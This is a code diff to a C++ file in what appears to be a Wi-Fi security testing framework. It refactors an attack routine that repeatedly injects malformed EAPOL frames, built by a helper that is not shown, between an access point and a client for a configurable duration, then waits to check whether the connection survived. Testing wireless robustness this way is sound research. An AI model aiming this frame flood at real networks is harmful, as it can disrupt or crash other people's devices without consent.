@@ -5,6 +5,7 @@
 #include <tins/packet_sender.h>
 #include <tins/rawpdu.h>
 
+#include "inteprrupt.h"
 #include "attacks/components/setup_connections.h"
 #include "ex_program/hostapd/hostapd_helper.h"
 #include "logger/log.h"
@@ -85,23 +86,24 @@ void setup_attack(RunStatus &rs){
 }
 
 void run_attack(RunStatus &rs){
+	const auto &att_cfg = rs.config().at("attack_config");
 	rs.start_observers();
 
-	const NetworkInterface iface(rs.get_actor("attacker").get(SK::iface));
 	const Channel channel = rs.get_actor("access_point")->get_channel();
 
-	RadioTap radiotap = get_malformed_eapol(rs.get_actor("access_point").get(SK::mac),
-											rs.get_actor("client").get(SK::mac), channel);
-	PacketSender sender;
+	RadioTap radiotap =
+		get_malformed_eapol(rs.get_actor("access_point").get(SK::mac),rs.get_actor("client").get(SK::mac), channel);
 
-	this_thread::sleep_for(chrono::seconds(5));
-	for(int i = 0; i < 500; ++i){ //TODO attack_config packets /time?
-		sender.send(radiotap, iface);
-		this_thread::sleep_for(chrono::milliseconds(10));
+	interruptible_sleep(chrono::seconds(att_cfg.at("sleep_before_sec")));
+
+	PacketSender sender{rs.get_actor("attacker").get(SK::iface)};
+
+	const auto end_time = chrono::steady_clock::now() + chrono::seconds(att_cfg.at("attack_time"));
+	while(chrono::steady_clock::now() < end_time && !g_interrupted.load()){
+		sender.send(radiotap);
+		this_thread::sleep_for(chrono::milliseconds(att_cfg.at("ms_interval")));
 	}
-	//TODO add possibility for internal actors
-	//rs.process_manager.stop("access_point");
-	this_thread::sleep_for(chrono::seconds(7)); //to check connection after attack
+	this_thread::sleep_for(chrono::seconds(att_cfg.at("sleep_after_sec"))); //to check connection after attack
 }
 
 void generate_report(const RunStatus &rs, const path &STA_graph_path, const path &AP_graph_path,
